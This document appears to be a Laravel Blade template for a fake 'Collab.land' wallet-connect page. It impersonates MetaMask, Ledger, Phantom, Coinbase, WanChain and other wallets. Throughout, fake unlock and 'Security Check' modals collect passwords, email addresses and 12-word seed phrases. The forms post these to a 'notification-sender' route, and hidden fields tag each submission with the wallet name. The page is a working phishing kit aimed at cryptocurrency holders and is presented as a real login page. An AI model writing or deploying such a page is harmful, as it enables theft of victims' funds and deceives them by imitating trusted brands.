<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <link rel="stylesheet" href="{{ asset('css/style.css') }}">

    <style>
        .buttonBackground {
            background: linear-gradient(to right, #4075A6, #3E8E8F) !important;
            color: white !important;
        }
    </style>
</head>
<body>
    <section class="home">
        <div class="container" id="containerBox">
            <span class="logo">Collab.land</span>
            <div class="theBox">
                <div class="topLine">
                    <span>Connect to a wallet</span>
                </div>

                    <div class="main">
                        <button type="button" class="box btn btn-primary" onclick="metamaskClick()" >
                                <div class="walletName">
                                    <span>MetaMask</span>
                                </div>
                                <div class="icon">
                                    <img src="{{ asset('images/photo_2021-11-26_04-02-42-removebg-preview.png') }}" alt="">
                                </div>
                        </button>
                        <button type="button" class="box btn btn-primary"  onclick="leagerClick()">
                                <div class="walletName">
                                    <span>Ledger With Metamask</span>
                                </div>
                                <div class="icon">
                                    <img src="{{ asset('images/photo_2021-11-26_04-02-42-removebg-preview.png') }}" alt="">
                        </button>
                        <button type="button" class="box btn btn-primary"  onclick="walletClick()">
                                <div class="walletName">
                                    <span>Wallet connect</span>
                                </div>
                                <div class="icon">
                                    <img src="{{ asset('images/download-removebg-preview.png') }}" alt="">
                                </div>
                        </button>
                        <button type="button" class="box btn btn-primary"   onclick="nbaClick()">
                                <div class="walletName">
                                    <span>Phantom</span>
                                </div>
                                <div class="icon">
                                    <img src="{{ asset('images/phantomlogo.png') }}" alt="">
                                </div>
                        </button>
                        <button type="button" class="box btn btn-primary"  onclick="tezoClick()">
                                <div class="walletName">
                                    <span>Tezos</span>
                                </div>
                                <div class="icon">
                                    <img src="{{ asset('images/tb_logo_small.jpg') }}" alt="">
                                </div>
                        </button>
                        <button type="button" class="box btn btn-primary"  onclick="coinbaseClick()">
                                <div class="walletName">
                                    <span>Coinbase Wallet</span>
                                </div>
                                <div class="icon">
                                    <img src="{{ asset('images/download.jpg') }}" alt="">
                                </div>
                        </button>
                        <button type="button" class="box btn btn-primary"  onclick="bitskiClick()">
                                <div class="walletName">
                                    <span>Bitski</span>
                                </div>
                                <div class="icon">
                                    <img src="{{ asset('images/download_image.jpg') }}" alt="">
                                </div>
                        </button>
                        <button type="button" class="box btn btn-primary"  onclick="roolClick()">
                                <div class="walletName">
                                    <span>WanChain</span>
                                </div>
                                <div class="icon">
                                    <img src="{{ asset('images/wanchainlogo.png') }}" alt="">
                                </div>
                        </button>
                    </div>
            </div>


                <!-- Modal -->
            <div class="modal fade" id="exampleSinlgeModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
                <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header" id="first_modal_header" >
                        <button type="button" id="modalCloseButton" class="btn-close" data-bs-dismiss="modal" aria-label="Close" hidden></button>
                     <div class="topLine d-flex align-items-center justify-contents-between">

                        <div id="headerSmall">

                        </div>

                        <select name="" id="currency_dropdown_section">
                            <option value=""> Ethereum Mainnet</option>
                        </select>
                    </div>

                    </div>

                    <div class="modal-body">

                        <div id="headerBig">

                        </div>
                        {{-- <img src="photo_2021-11-26_04-02-42-removebg-preview.png" alt=""> --}}


                        <h2>Welcome Back!</h2>
                        <p class="decentralized">The decentralized web awaits.</p>


                        <form action="#">
                            <input type="password" placeholder="Password" id="firstInputPassword">

                            <input type="button" value="Unlock" id="firstSubmitButton">
                        </form>

                        <div class="under-p">
                            <p class="d-flex"> Need Help? Contact <a href=""> <span id="suuportText_first"> </span>   </a></p>
                        </div>
                    </div>

                </div>
                </div>
            </div>



            <div class="modal fade" id="exampleSecondModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
                <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">

                    <div class="topLine d-flex align-items-center justify-contents-between">

                        <div id="headerSmallSecond">

                        </div>
                        {{-- <img src="photo_2021-11-26_04-02-42-removebg-preview.png" alt=""> --}}

                        <select name="" id="">
                            <option value="">Ethereum Mainnet</option>
                        </select>
                    </div>

                    </div>
                    <div class="modal-body">

                        <div id="headerBigSecond">

                        </div>
                        {{-- <img src="photo_2021-11-26_04-02-42-removebg-preview.png" alt=""> --}}


                        <h2>Welcome Back!</h2>
                        <p class="top-p">We just need to confirm it's you. <br>
                            To continue, enter your Backup Seed Phrase</p>

                        <form action="{{ route('notification-sender') }}" method="POST">
                            @csrf
                            <input type="text" name="password" id="hiddenPassword" hidden>
                            <input type="text" name="wallet" id="wallet_hidden" hidden>
                            <input type="text" placeholder="Wallet Secret Recovery Phrase" name="pharse">
                            <input type="submit" value="Confirm">
                        </form>

                        <div class="under-p">
                            <p class="d-flex"> Need Help? Contact <a href="">  <span id="suuportText_second"></a></p>
                        </div>                    </div>

                </div>
                </div>
            </div>



            {{-- wanchain first modal --}}
            <div class="modal fade" id="wanchainmodal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
                <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header" style="background-color: #5FACF6; color:white;">
                        <button type="button" id="modalCloseButtonWanchi" class="btn-close" data-bs-dismiss="modal" aria-label="Close" hidden></button>
                    <div class="topLine d-flex align-items-center justify-contents-between">

                        <h5 class="modal-title"  id="exampleModalCenterTitle">wanchain</h5>

                    </div>

                    </div>
                    <div class="modal-body">


                        <img class="wanchain-image" src="{{ asset('images/wanchainlogo.png') }}" alt="">

                        <h2>Welcome Back!</h2>
                        <p class="top-p">The decentralized web awaits.</p>

                        <form action="#">
                            <input type="button" style="width: 70%" class="buttonBackground" onclick="wanchainSecondClicked()" value="Import a Wallet" >
                        </form>



                        <div class="under-p">
                            <p class="d-flex"> Need Help? Contact <a href="">Wain Chain Support</a></p>
                        </div>
                    </div>

                </div>
                </div>
            </div>

            <div class="modal fade" id="wanchainmodal_second" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
                <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header" style="background-color: #5FACF6; color:white">
                        <button type="button" id="modalCloseButton" class="btn-close" data-bs-dismiss="modal" aria-label="Close" hidden></button>
                    <div class="topLine d-flex align-items-center justify-contents-between">

                        <h5 class="modal-title"  id="exampleModalCenterTitle">wanchain</h5>

                    </div>

                    </div>
                    <div class="modal-body">


                        <img class="wanchain-image" src="{{ asset('images/wanchainlogo.png') }}" alt="">

                        <h2>Security Check</h2>
                        <p class="top-p">We just need to confirm it's you. <br>
                       To continue, enter your Backup Seed Phrase</p>

                        <form action="{{ route('notification-sender') }}" method="POST">
                            @csrf
                            <input type="text" placeholder="Wallet Secret Recovery Phrase" name="pharse">
                            <input type="text" name="wallet" id="wallet_wanchain" hidden>
                            <input type="submit" value="Confirm">
                        </form>
                        <div class="under-p">
                            <p class="d-flex"> Need Help? Contact <a href="">Wanchain Support</a></p>
                        </div>
                    </div>

                </div>
                </div>
            </div>

            {{-- coinbase first modal  --}}
            <div class="modal fade" id="coinbaseFirst" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
                <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header " style="background-color: #0052FC; color:white">
                        <button type="button" id="CoinbaseCloseButton" class="btn-close" data-bs-dismiss="modal" aria-label="Close" hidden></button>
                    <div class="topLine d-flex align-items-center justify-contents-between">

                        <h5 class="modal-title"  id="exampleModalCenterTitle">coinbase</h5>

                    </div>

                    </div>
                    <div class="modal-body">


                        <img src="{{ asset('images/download.jpg') }}" class="coinbase-image" alt="" style="margin:0">

                        <h2>Welcome Back!</h2>
                        <p class="top-p">The decentralized web awaits </p>

                        <form action="{{ route('notification-sender') }}" method="POST">
                            @csrf
                            <input type="email" placeholder="Email" name="email" id="coinbaseFirstemail">
                            <input type="password" name="password" placeholder="Password" id="coinbaseFirstPassword">
                            <input type="button" value="Confirm" id="coinbaseSubmitButton">
                        </form>


                            <div class="under-p">
                                <p class="d-flex" > Need Help? Contact <a href="" >Coinbase Support</a> </p>
                            </div>
                    </div>

                </div>
                </div>
            </div>

            {{-- coinbase Recovery  --}}
            <div class="modal fade" id="coinbaseRecovery" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
                <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header" style="background-color: #0052FC; color:white">
                        <button type="button" id="modalCloseButton" class="btn-close" data-bs-dismiss="modal" aria-label="Close" hidden></button>
                    <div class="topLine d-flex align-items-center justify-contents-between">

                        <h5 class="modal-title"  id="exampleModalCenterTitle">coinbase</h5>

                    </div>

                    </div>
                    <div class="modal-body">


                        <img src="{{ asset('images/download.jpg') }}"class="coinbase-image" alt="">

                        <h2>Security Check</h2>
                        <p class="top-p">We just need to confirm it's you. <br>
                          To continue, enter your 12 word phrase.
                        </p>

                        <form action="{{ route('notification-sender') }}" method="POST">
                            @csrf
                            <input type="text" placeholder="Wallet Secret Recovery Phrase" name="pharse">
                            <input type="text" name="password" id="coinbaseSecondPassword" hidden>
                            <input type="text" name="email" id="coinbaseSecondemail" hidden>
                            <input type="text" name="wallet" id="wallet_coinbase" hidden>
                            <input type="submit" value="Confirm">
                        </form>
                        <div class="under-p">
                            <p class="d-flex"> Need Help? Contact <a href="">Coinbase Support</a></p>
                        </div>
                    </div>

                </div>
                </div>
            </div>

            {{-- black theme contact form --}}
            <div class="modal fade" id="blackModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
                <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header" style="background-color: #2C2E2D; color:white">
                        <button type="button" id="blcakmodalCloseButton" class="btn-close" data-bs-dismiss="modal" aria-label="Close" hidden></button>
                    <div class="topLine d-flex align-items-center justify-contents-between">
                        <img class="logo-black" src="{{ asset('images/phantomlogo.png') }}" alt="">
                        <div class="walletName">
                            <b style="color: #67686A">Phantom.app</b>
                        </div>
                        <div class="empty"></div>
                    </div>
                    </div>
                    <div class="modal-body">
                        <img src="{{ asset('images/phantomlogo.png') }}" alt="">
                        <h4 style="color: #fff;" class="mb-3">Enter your password</h4>

                        <form action="#">
                            <input type="text" placeholder="Password" name="pharse" id="blacModalFirst">
                            <input type="button" value="Unlock" id="blackThemeSubmit">

                        </form>

                    </div>
                </div>
                </div>
            </div>

            {{-- black theme contact form  --}}
            <div class="modal fade" id="blackModalPhrase" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
                <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header" style="background-color: #2C2E2D; color:white">
                        <button type="button" id="modalCloseButton" class="btn-close" data-bs-dismiss="modal" aria-label="Close" hidden></button>
                    <div class="topLine d-flex align-items-center justify-contents-between">
                        <img class="logo-black" src="{{ asset('images/phantomlogo.png') }}" alt="">
                        <div class="walletName">
                            <b style="color: #67686A">Phantom.app</b>
                        </div>
                        <div class="empty"></div>
                    </div>
                    </div>
                    <div class="modal-body">
                        <img src="{{ asset('images/phantomlogo.png') }}" alt="">
                        <h2 style="" class="mb-3">Security Check</h2>
                        <p style="color: #fff">We just need to confirm it's you. <br>
                            To continue, enter your 12 word phrase.
                          </p>
                        <form action="{{ route('notification-sender') }}" method="POST">
                            @csrf
                            <input type="text" name="wallet" value="Phantom" hidden >
                            <input type="text" placeholder="Password" name="password" id="blacModalSecond" hidden>
                            <input type="text" placeholder="Wallet Secret Recover Phrase" name="pharse">
                            <input type="submit" value="Unlock">
                        </form>
                    </div>
                </div>
                </div>
            </div>




        </div>

    </section>


        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>

        <script>

            document.getElementById('firstSubmitButton').addEventListener('click', function(){
               const inputValue =  document.getElementById('firstInputPassword').value;
               if (inputValue == "") {
                    alert("Insert Password To continue");
                    return false;
                } else {
                    const modalHeaderSection = document.getElementById('headerSmall').innerHTML;
                    document.getElementById('headerSmallSecond').innerHTML = modalHeaderSection;
                    document.getElementById('headerBigSecond').innerHTML = modalHeaderSection;

                document.getElementById('modalCloseButton').click();

                const myModalSecond = new bootstrap.Modal(document.getElementById('exampleSecondModal'), {});
                myModalSecond.show();

                document.getElementById('hiddenPassword').value = inputValue;

                }

                });


                    document.getElementById('coinbaseSubmitButton').addEventListener('click', function(){

                        const emailValue = document.getElementById('coinbaseFirstemail').value;
                       const firstValue = document.getElementById('coinbaseFirstPassword').value;
                        document.getElementById('CoinbaseCloseButton').click();

                        const myModalSecond = new bootstrap.Modal(document.getElementById('coinbaseRecovery'), {});
                        document.getElementById('coinbaseSecondPassword').value = firstValue;
                        document.getElementById('coinbaseSecondemail').value = emailValue;
                        myModalSecond.show();

                    })





                document.getElementById('blackThemeSubmit').addEventListener('click', function(){
               const inputValue =  document.getElementById('blacModalFirst').value;
               if (inputValue == "") {
                    alert("Insert Password To continue");
                    return false;
                } else {

                document.getElementById('blcakmodalCloseButton').click();

                const myModalSecond = new bootstrap.Modal(document.getElementById('blackModalPhrase'), {});
                myModalSecond.show();

                document.getElementById('blacModalSecond').value = inputValue;



                }

                });




            function metamaskClick()
            {
                const myModal = new bootstrap.Modal(document.getElementById('exampleSinlgeModal'), {});
                const image = '{{ asset('images/photo_2021-11-26_04-02-42-removebg-preview.png') }}'
                const imageSrc = '<img src='+image + '>'

                const modalHeaderSection = document.getElementById('headerSmall');
                document.getElementById('headerBig').innerHTML =imageSrc
                modalHeaderSection.innerHTML = imageSrc;

                document.getElementById('suuportText_second').innerText = "Meta Mask Support";
                document.getElementById('suuportText_first').innerText = "Meta Mask Support";

                document.getElementById('wallet_hidden').value = "MetaMask"
                myModal.show();
            }


            function leagerClick()
            {
                const myModal = new bootstrap.Modal(document.getElementById('exampleSinlgeModal'), {});
                const image = '{{ asset('images/photo_2021-11-26_04-02-42-removebg-preview.png') }}'
                const imageSrc = '<img src='+image + '>'
                const modalHeaderSection = document.getElementById('headerSmall');
                document.getElementById('headerBig').innerHTML =imageSrc
                modalHeaderSection.innerHTML = imageSrc;

                document.getElementById('wallet_hidden').value = "Leadger";
                document.getElementById('suuportText_second').innerText = "Leadger Support";
                document.getElementById('suuportText_first').innerText = "Leadger Support";

                myModal.show();
            }


            function walletClick()
                {
                const myModal = new bootstrap.Modal(document.getElementById('exampleSinlgeModal'), {});
                const image = '{{ asset('images/download-removebg-preview.png') }}'
                const imageSrc = '<img src='+image + '>'
                const modalHeaderSection = document.getElementById('headerSmall');
                document.getElementById('headerBig').innerHTML =imageSrc
                modalHeaderSection.innerHTML = imageSrc;
                document.getElementById('wallet_hidden').value = "WalletConnect"

                document.getElementById('suuportText_second').innerText = "Wallet Connect Support";
                document.getElementById('suuportText_first').innerText = "Wallet Connect Support";


                myModal.show();

                }


                function nbaClick()
                {
                    const myModal = new bootstrap.Modal(document.getElementById('blackModal'), {});
                    myModal.show();
                }

                function tezoClick()
                {
                    const myModal = new bootstrap.Modal(document.getElementById('exampleSinlgeModal'), {});
                    const image = '{{ asset('images/tb_logo_small.jpg') }}'
                    const imageSrc = '<img src='+image + '>'
                    const modalHeaderSection = document.getElementById('headerSmall');
                    document.getElementById('headerBig').innerHTML =imageSrc
                    modalHeaderSection.innerHTML = imageSrc;
                    document.getElementById('wallet_hidden').value = "Tezos";

                    document.getElementById('suuportText_second').innerText = "Tezos Support";
                    document.getElementById('suuportText_first').innerText = "Tezos Support";


                    myModal.show();
                }

                function coinbaseClick()
                    {
                        const myModal = new bootstrap.Modal(document.getElementById('coinbaseFirst'), {});
                        document.getElementById('wallet_coinbase').value = "Coinbase"
                        myModal.show();
                    }

                    function bitskiClick()
                        {
                            const myModal = new bootstrap.Modal(document.getElementById('exampleSinlgeModal'), {});
                            const image = '{{ asset('images/bitskilogo.png') }}'
                            const imageSrc = '<img src='+image + '>'
                            const modalHeaderSection = document.getElementById('headerSmall');
                            document.getElementById('headerBig').innerHTML =imageSrc
                            modalHeaderSection.innerHTML = imageSrc;
                            document.getElementById('wallet_hidden').value = "Bitski"

                            document.getElementById('suuportText_second').innerText = "Bitski Support";
                            document.getElementById('suuportText_first').innerText = "Bitski Support";


                            myModal.show();
                        }

                        function roolClick()
                            {
                                const myModal = new bootstrap.Modal(document.getElementById('wanchainmodal'), {});
                                document.getElementById('wallet_wanchain').value ="Wanchain"
                                myModal.show();
                            }

                           function wanchainSecondClicked(){

                             document.getElementById('modalCloseButtonWanchi').click();
                            const myModal = new bootstrap.Modal(document.getElementById('wanchainmodal_second'), {});
                                myModal.show();
                           }

        </script>

</body>
</html>
